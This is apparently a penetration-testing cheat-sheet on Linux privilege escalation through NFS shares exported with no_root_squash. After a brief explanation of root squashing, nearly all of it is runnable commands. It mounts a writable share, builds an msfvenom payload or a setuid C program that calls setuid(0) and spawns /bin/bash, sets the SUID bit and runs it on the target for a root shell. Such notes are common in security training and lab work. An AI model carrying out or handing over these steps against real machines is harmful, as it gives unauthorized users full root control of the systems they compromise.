- - -
## Explaination :

**Root Squash** :
Root Squashing is how **NFS** prevents an obvious privilege escalation.
If the remote user is (or claims to be) **root** (uid=0), NFS will instead “**squash**” the user and
treat them as if they are the“**nobody**” user, in the “**nogroup**” group.
While this behavior is default, it can be disabled!

**No_Root_Squash :**
**no_root_squash** is an **NFS** **configuration** option which turns root **squashing off**.
When included in a writable share configuration, a remote user who identifies as “**root**” can create files on the NFS share as the local **root** user.

- - -

## Checking for Prvilege Escalation :

Check the contents of /etc/exports for shares with the **no_root_squash** option: ( ON Target Machine )

```sh
cat /etc/exports
```

Confirm that the NFS share is available for remote mounting:

```sh
showmount -e $IP
```

- - -

## Privilege Escalation Technique [ [ 1 ] ]  :

```sh
mkdir /tmp/nfs
```

```sh
mount -o rw,vers=2 $IP:/Share_name /tmp/nfs
```

Using the root user on your local machine, generate a payload and save it to the mounted share:

```sh
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

```sh
chmod +xs /tmp/nfs/shell.elf
```

On the target machine, execute the file to get a root shell:

```sh
/Path/to/the/Share/shell.elf
```


## Privilege Escalation Technique [ [ 2 ] ]  :

```sh
mkdir /tmp/mountme
```

```sh
mount -o rw,vers=2 $IP:/Share_name /tmp/mountme
```

```sh
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
```

```sh
cat /tmp/mountme/x.c
```

```sh
gcc /tmp/mountme/x.c -o /tmp/mountme/x
```

```sh
chmod +xs /tmp/mountme/x
```

On target machine, execute the file to get a root shell:

```sh
cd /path/to/the/share
```

```sh
./x
```

- - -

